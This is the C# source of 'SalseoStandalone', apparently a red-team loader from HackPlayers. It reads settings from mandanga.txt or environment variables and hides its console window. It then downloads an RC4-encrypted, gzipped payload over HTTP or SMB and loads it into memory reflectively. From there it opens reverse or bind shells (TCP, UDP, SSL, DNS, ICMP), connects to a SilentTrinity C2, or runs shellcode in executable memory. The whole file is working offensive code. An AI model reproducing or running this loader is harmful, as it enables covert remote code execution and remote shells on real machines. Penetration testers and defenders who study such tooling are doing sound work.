/*
 * Created by SharpDevelop.
 * User: CyberVaca 
 * Twitter: https://twitter.com/CyberVaca_
 * Date: 10/11/2018
 * Time: 0:05
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.IO.Compression;
using System.Reflection;
using System.Diagnostics;
namespace SalseoDecrypter
{

    class Program
    {
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void main()
        {
            //#############################################################
            //########### Leyendo Variables de Entorno dll ################
            //#############################################################
            string varpass = null;
            string varpayload = null;
            string varshell = null;
            string varlhost = null;
            string varlport = null;
            string vardnsserver = null;
	    string url_c2c = null;
            if ((Environment.GetEnvironmentVariable("PASS")) != null) { varpass = Environment.GetEnvironmentVariable("PASS"); } else { };
            if ((Environment.GetEnvironmentVariable("PAYLOAD")) != null) { varpayload = Environment.GetEnvironmentVariable("PAYLOAD"); } else { };
            if ((Environment.GetEnvironmentVariable("SHELL")) != null) { varshell = Environment.GetEnvironmentVariable("SHELL"); } else { };
            if ((Environment.GetEnvironmentVariable("LHOST")) != null) { varlhost = Environment.GetEnvironmentVariable("LHOST"); } else { };
            if ((Environment.GetEnvironmentVariable("LPORT")) != null) { varlport = Environment.GetEnvironmentVariable("LPORT"); } else { };
            if ((Environment.GetEnvironmentVariable("DNSSERVER")) != null) { vardnsserver = Environment.GetEnvironmentVariable("DNSSERVER"); } else { };
	    if ((Environment.GetEnvironmentVariable("URL_C2C")) != null) { url_c2c = Environment.GetEnvironmentVariable("URL_C2C"); } else { };
	    if (varpass != null & varpayload != null & url_c2c != null & varshell.ToLower() == "silenttrinity") { string[] argumentos = { varpass, varpayload, varshell, url_c2c }; Main(argumentos); };
            if (varpass != null & varpayload !=null & varshell.ToLower() == "shellcode" ) {string[] argumentos = {varpass, varpayload, varshell}; Main(argumentos); };
            if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver == null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, varlport }; Main(argumentos); };
            if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver != null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, vardnsserver}; Main(argumentos); };

        }
        static void Main(string[] args)
        {
    	IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
    	ShowWindow(h, 0);
            string banner = @"
  _____  ____  _     _____   ___   ___    
 / ___/ /    || |   / ___/  /  _] /   \   
(   \_ |  o  || |  (   \_  /  [_ |     |  
 \__  ||     || |___\__  ||    _]|  O  |  
 /  \ ||  _  ||     /  \ ||   [_ |     |  
 \    ||  |  ||     \    ||     ||     |  
  \___||__|__||_____|\___||_____| \___/   
                                          
 _       ___    ____  ___      ___  ____  
| |     /   \  /    ||   \    /  _]|    \ 
| |    |     ||  o  ||    \  /  [_ |  D  )
| |___ |  O  ||     ||  D  ||    _]|    / 
|     ||     ||  _  ||     ||   [_ |    \ 
|     ||     ||  |  ||     ||     ||  .  \
|_____| \___/ |__|__||_____||_____||__|\_|

";
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write(banner);
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("                             By: CyberVaca@HackPlayers");
            
            string ayuda = @"
[+] Usage:

    [-] SalseoStandalone.exe
    [-] You need to have your mandanga.txt on the same folder!
    [-] Serve your payload as you want! SMB, HTTP, Locally...
    [-] Want a meterpreter shell? Create a raw payload with msfvenom,
        encrypt it with encrypterassembly.py and use shellcode function.

    [-] Mandanga.txt contents:
        [-] Reverse TCP/UDP/SSL     [-] Reverse ICMP        [-] Reverse DNS
            <password>                  <password>              <password>
            <path_to_elmal.txt>         <path_to_elmal.txt>     <path_to_elmal.txt>
            reversetcp/udp/ssl          reverseicmp             reversedns
            <LHOST>                     <LHOST>                 <LHOST>
            <LPORT>                                             <DNS Server>

        [-] Bind TCP                [-] SilentTrinity       [-] Shellcode
            <password>                  <password>              <password>
            <path_to_elmal.txt>         <path_to_elmal.txt>     <path_to_payload.txt>
            bindtcp                     silenttrinity           shellcode
            <LHOST>                     <URL_to_C2C>             
            <LPORT> 
   
[+] Available Payloads:

    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL  [-] Shellcode
    [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP     [-] SilentTrinity

";
            //################### Parametros del Loader y comprobacion de los argumentos introducidos ################### 

            //////////////////////STANDALONE VERSION
            string file_name = ".\\mandanga.txt";
            string clave = "";
            string Salseo_URL = "";
            string funcion = "";
            string DNSServer = "";
            string URLSILENT = "";
            string LHOST = "";
            string LPORT = "";
            if (System.IO.File.Exists(file_name) == true)
            {
                System.IO.StreamReader objReader;
                try
                {
                    if (File.ReadLines(file_name).Count() < 3) { Console.WriteLine(ayuda); Environment.Exit(1); }
                    objReader = new System.IO.StreamReader(file_name);
                    clave = objReader.ReadLine(); //Pass. ALways present.
                    Salseo_URL = objReader.ReadLine(); //elmal.txt or shellcode.txt. Always present.
                    funcion = objReader.ReadLine().ToLower(); //Chosen function. Always present.
                
                    Console.WriteLine("[+] Password: " + clave);
                    if (funcion == "shellcode") { Console.WriteLine("[+] Shellcode path: " + Salseo_URL); } else { Console.WriteLine("[+] Elmal.txt path: " + Salseo_URL); }
                    Console.WriteLine("[+] Chosen Function: " + funcion);
                    if (funcion == "shellcode")
                    {
                    }
                    else if(funcion == "silenttrinity")
                    {
                        if (File.ReadLines(file_name).Count() < 4) { Console.WriteLine(ayuda); Environment.Exit(1); }
                        URLSILENT = objReader.ReadLine(); //SilentTrinity URL.
                        Console.WriteLine("[+] SilentTrinity URL: " + URLSILENT);
                    }
                    else if (funcion == "icmp")
                    {
                        if (File.ReadLines(file_name).Count() < 4) { Console.WriteLine(ayuda); Environment.Exit(1); }
                        LHOST = objReader.ReadLine(); //SilentTrinity URL.
                        Console.WriteLine("[+] SilentTrinity URL: " + LHOST);
                    }
                    else if (funcion == "serverdns")
                    {
                        //HOST + DNSserver for dns shells.
                        if (File.ReadLines(file_name).Count() < 5) { Console.WriteLine(ayuda); Environment.Exit(1); }
                        LHOST = objReader.ReadLine();
                        DNSServer = objReader.ReadLine();
                        Console.WriteLine("IP: " + LHOST);
                        Console.WriteLine("Port: " + DNSServer);
                    }
                    else
                    {
                        //HOST + PORT for bind/reverse shells.
                        if (File.ReadLines(file_name).Count() < 5) { Console.WriteLine(ayuda); Environment.Exit(1); }
                        LHOST = objReader.ReadLine();
                        LPORT = objReader.ReadLine();
                        Console.WriteLine("IP: " + LHOST);
                        Console.WriteLine("Port: " + LPORT);

                    }
                    objReader.Close();
                }
                catch (System.NullReferenceException e)
                {
                    Console.WriteLine(e);
                }
            }
            else{ Console.WriteLine(ayuda); Console.WriteLine("[-] .\\mandanga.txt file does not exist."); Environment.Exit(1); }



            string Salseo_Encriptado = null;
            byte[] xKey = Encoding.ASCII.GetBytes(clave);
            Console.ForegroundColor = ConsoleColor.Gray;
            if (Salseo_URL.Substring(0, 4).ToLower() == "http") { Salseo_Encriptado = ClienteWeb.LeePayload(Salseo_URL); }
            if (Salseo_URL.Substring(0, 2).ToLower() == "\\\\") { Console.WriteLine("[+] Leyendo datos via SMB..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(Salseo_URL); }
            if (Salseo_URL.Substring(0, 4).ToLower() != "http" && Salseo_URL.Substring(0, 2).ToLower() != "\\\\") { Console.WriteLine("[+] Leyendo datos via LOCAL..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(Salseo_URL); }
            //#############################################################
            //####################### Cargando dll ######################## 
            //#############################################################

            string hexadecimal = Zipea.Descomprime(Salseo_Encriptado);
            byte[] Final_Payload_encriptado = StringHEXToByteArray.Convierte(hexadecimal);
            byte[] Final_Payload = RC4.Decrypt(xKey, Final_Payload_encriptado);
            string clases = null;
            Assembly salsongo = null;
            
            if (funcion != "shellcode" )
            {
                salsongo = Assembly.Load(Final_Payload);
                Console.WriteLine("[+] Cargando la salsa en memoria.");
                Console.WriteLine("[+] Namespace de Assembly : " + salsongo.GetName().Name);
                foreach (Type infoass in salsongo.GetTypes()) { var strclase = string.Format("{0}", infoass.Name); clases = strclase; };
            }

            //########################### LLamada a funcion SilentTrinity ########################
            if (funcion == "silenttrinity")
            {
                string[] argumentos = new string[] { URLSILENT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("lanza");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            //########################### LLamada a funcion Reversa ########################
            
            if (funcion == "reversetcp")
            {                  
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reversetcp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reversessl")
            {
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reversessl");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reverseudp")
            {
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reverseudp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reversedns")
            {
                string[] argumentos = new string[] { LHOST + " " + DNSServer };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reversedns");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reverseicmp")
            {
                string[] argumentos = new string[] { LHOST + " " };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reverseicmp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "bindtcp")
            {
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("bindtcp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }      
            if (funcion == "shellcode")
            {
                byte[] sc = Final_Payload;
                IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: No se pudo asignar la memoria remota.");
                Console.WriteLine("[+] Intentando cargar Shellcode");

                try
                {
                    Marshal.Copy(sc, 0, baseAddr, sc.Length);
                    ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));

                    del();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
                finally
                {
                    VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
                }
            }
        }
        }
    }



    public class BiteArrayToHex
    {
        public static string Convierte(byte[] bytearray_a_convertir)
        {
            return (BitConverter.ToString(bytearray_a_convertir)).Replace("-", "").ToLower();
        }

    }

    public class BiteArrayFromArchivo
    {

        public static byte[] ExtraeBites(string Archivo_a_leer)
        {
            byte[] Bites_extraidos = System.IO.File.ReadAllBytes(Archivo_a_leer);
            return Bites_extraidos;
        }


    }

    public class StringHEXToByteArray
    {
        public static byte[] Convierte(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];

            for (int i = 0; i < NumberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }

            return bytes;
        }
    }

    public class BitArrayToString
    {

        public static string Convierte(byte[] movidaaconvertir)
        {
            string a = "";
            foreach (Byte b in movidaaconvertir)
            {
                a += (b + " ");
            }
            return a;
        }

    }

    public class RC4
    {

        public static byte[] Encrypt(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }

        public static byte[] Decrypt(byte[] pwd, byte[] data)
        {
            return Encrypt(pwd, data);
        }

        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

    }

    public class ClienteWeb
    {

        public static string LeePayload(string URL)
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("[+] Leyendo datos via HTTP...");
                WebClient client = new WebClient();
                client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                Stream data = client.OpenRead(URL);
                StreamReader reader = new StreamReader(data);
                string Salseo_Encriptado = reader.ReadToEnd();
                data.Close();
                reader.Close();
                return Salseo_Encriptado;
            }
            catch
            {

                Console.WriteLine("[-] Error: No se pudo conectar con la URL proporcionada :(");
                Environment.Exit(1);
                return "[-] Error: No se pudo conectar con la URL proporcionada :(";

            }

        }
    }
    
    public class LeeArchivoSMBorLocal
    {

        public static string Archivo(string ruta)
        {
            return File.ReadAllText(ruta, Encoding.UTF8);

        }
    }

    public class Zipea
    {
        private static void CopyTo(Stream src, Stream dest)
        {
            byte[] bytes = new byte[4096];

            int cnt;

            while ((cnt = src.Read(bytes, 0, bytes.Length)) != 0)
            {
                dest.Write(bytes, 0, cnt);
            }
        }

        public static string Comprime(string movidaacomprimir)
        {

            byte[] inputBytes = Encoding.UTF8.GetBytes(movidaacomprimir);

            using (var outputStream = new MemoryStream())
            {
                using (var gZipStream = new GZipStream(outputStream, CompressionMode.Compress))
                    gZipStream.Write(inputBytes, 0, inputBytes.Length);
                var outputBytes = outputStream.ToArray();
                var outputbase64 = Convert.ToBase64String(outputBytes);
                return outputbase64;

            }
        }
        public static string Descomprime(string movidaadescomprimir)
        {
            byte[] gZipBuffer = Convert.FromBase64String(movidaadescomprimir);
            using (var msi = new MemoryStream(gZipBuffer))
            using (var mso = new MemoryStream())
            {
                using (var gs = new GZipStream(msi, CompressionMode.Decompress))
                {

                    CopyTo(gs, mso);
                }

                return Encoding.UTF8.GetString(mso.ToArray());
            }


        }
    }






